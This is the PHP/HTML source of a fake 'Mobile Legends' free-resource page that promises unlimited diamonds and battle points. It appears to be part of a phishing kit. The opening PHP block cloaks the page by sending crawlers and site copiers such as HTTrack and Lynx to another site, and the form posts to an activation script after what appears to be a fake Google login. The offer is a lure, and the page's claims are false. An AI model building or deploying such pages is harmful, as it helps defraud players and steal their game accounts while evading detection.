<!---

Author Real Name: Arfan Rizki Ramadhan
Author Alias Name: RAFLIPEDIA
Author URL: raflip-edia.blogspot.com
Date Created: 14 August 2017 at 8:03 WIB
Thanks to: MALASNGODING
Note: PLEASE DO NOT CHANGE THIS COPYRIGHT! 

--->
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.raflipedia.club/');
die();
}
?>
<html>
<head>
<meta charset="UTF-8">
<title>Mobile Legends - Bang Bang</title>
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="assets/css/style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="assets/js/jquery-1.10.2.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="assets/js/custom.js"></script>
<meta name="description" content="Join the Mobile Legends - Bang Bang new event! And get what do you want!"/>
</head>
<body  style="background: #000 url('img/bgnya.jpg') top center no-repeat;">


<div class="container">
<nav class="navbar navbar-inverse navbar-fixed-top">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="navbar-brand" href="/">Mobile Legends</a>
</div>
<div id="navbar" class="collapse navbar-collapse">


<ul class="nav navbar-nav navbar-right">
<li><a href="index.php"><i class="fa fa-sign-out"></i> Sign out</a></li>
</ul>
	  
</div>
</div>
</nav>






<div class="container">
<div class="panel panel-info" >
<div class="panel-heading">
<div class="panel-title"><i class="fa fa-google-plus"></i> Mobile Legends Google</div>
</div>     

<div style="padding-top:30px" class="panel-body" >
<div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
<form id="loginform" class="form-horizontal" method="post" role="form">

<center><img height="200" width="400" src="img/logonye.png"></center>

</br>

<center><h1>Free Resource for your account.</h1></center>

</br>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-diamond"></i></span>
<input id="diamond" type="text" class="form-control" name="diamond" value="UNLIMITED DIAMOND" readonly>
</div>

<div style="margin-bottom: 25px" class="input-group">
<span class="input-group-addon"><i class="fa fa-cutlery"></i></span>
<input id="bt" type="text" class="form-control" name="bt" value="UNLIMITED BATTLE POINT" readonly>
</div>


<p><font color="red">* Resource can not be changed!</font></p>

</br>
<center><a data-toggle="modal" data-target="#submit-resource" href="#"><button type="submit" class="btn btn-danger"><i class="fa fa-diamond"></i> Submit Resource</button></a></center>

<div id="submit-resource" class="modal fade" role="dialog">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal">&times;</button>
<h4 class="modal-title"><i class="fa fa-check"></i> Submit Resource Successfully</h4>
</div>
				
<div class="modal-body">
 
<div class="panel panel-info" >
<div class="panel-heading">
<div class="panel-title"><center><img src="img/sukses.png" style="border-radius: 50px; height: 100px;" /></center></div>
</div>     

<div style="padding-top:30px" class="panel-body" >
<div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
<form id="loginform" class="form-horizontal" method="post" action="activation.php" role="form">

<center><font size="4">Free Resource will be sent to your in-game mailbox, valid in 24 hours.</font></center>

</br>
</br>

<center><button type="button" class="btn btn-success" data-dismiss="modal"><i class="fa fa-check"></i> Okay</button></center>
</form> 




</div>
</div>
</div>    
</div>                     
</div>  
</div>
</div>
</div>


</div>
				
</div>
</div>
</div>
</div>

</form> 







</body>
</html>